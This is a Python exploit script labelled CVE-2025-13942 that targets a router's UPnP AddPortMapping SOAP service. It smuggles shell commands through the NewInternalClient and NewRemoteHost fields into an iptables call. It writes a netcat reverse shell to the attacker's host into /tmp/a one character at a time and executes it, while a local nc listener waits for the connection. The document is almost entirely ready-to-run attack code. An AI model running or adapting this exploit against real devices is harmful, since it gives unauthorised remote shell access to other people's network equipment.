CVE-2025-13942/rce.py

import requests, sys, string, threading, os, time

if len(sys.argv) < 3:
    print("[x] Usage: python3 %s <target> <attacker>" % sys.argv[0])
    exit()

PORT = 4444
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (sys.argv[2], PORT)
NC_COMMAND = 'nc -lp %d' % PORT

target = sys.argv[1]
url = "http://%s:38400/WANPPPConnection:1" % target


def del_entry(port):
    headers = {
        "SOAPAction": "\"urn:schemas-upnp-org:service:WANPPPConnection:1#DeletePortMapping\"",
        "Content-Type": "text/xml"
    }
    data = """<?xml version="1.0"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <SOAP-ENV:Body>
            <m:DeletePortMapping xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1">
                <NewExternalPort>%d</NewExternalPort>
                <NewRemoteHost></NewRemoteHost>
                <NewProtocol>TCP</NewProtocol>
            </m:DeletePortMapping>
        </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    """ % port
    requests.post(url, headers=headers, data=data)

def add_entry(port, internal_client, remote_host="pwned"):
    # iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source <remote_host> --dport <port> -j DNAT --to <internal_client>:<port>
    headers = {
        "SOAPAction": "\"urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping\"",
        "Content-Type": "text/xml"
    }
    data = """<?xml version="1.0"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <SOAP-ENV:Body>
            <m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1">
                <NewPortMappingDescription>RCE</NewPortMappingDescription>
                <NewLeaseDuration>0</NewLeaseDuration>
                <NewInternalClient><![CDATA[%s]]></NewInternalClient>
                <NewEnabled>1</NewEnabled>
                <NewExternalPort>%d</NewExternalPort>
                <NewRemoteHost><![CDATA[%s]]></NewRemoteHost>
                <NewProtocol>TCP</NewProtocol>
                <NewInternalPort>%d</NewInternalPort>
            </m:AddPortMapping>
        </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    """ % (internal_client, port, remote_host, port)
    r = requests.post(url, headers=headers, data=data)
    if r.status_code != 200:
        print("[x] Something went wrong!")
        exit()


print("[+] Listening for connections on port %d..." % PORT)
t = threading.Thread(target=os.system, args=(NC_COMMAND,))
t.start()


print("[+] Cleaning existing port mapping entries")
del_entry(1)
add_entry(1,";rm /tmp/a;")
n = len(REVERSE_SHELL) + 1
for i in range(1,n + 1):
    del_entry(i)


print("[+] Building command on device")
i=1
for c in REVERSE_SHELL:
    # iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source ;a=/tmp/a;" --dport <port> -j DNAT --to ";printf X>>$a;:1337
    #       iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source ;
    #       a=/tmp/a;
    #       --dport 1337 -j DNAT --to;
    #       printf X>>$a;
    #       :<port>

    if c in string.ascii_lowercase:
        add_entry(i, ';printf %s>>$a;' % c, ';a=/tmp/a;')
    else:
        add_entry(i, ';printf \\%s>>$a;' % c, ';a=/tmp/a;')
    i += 1


print("[+] Executing command")
print()
add_entry(i,";sh /tmp/a;")
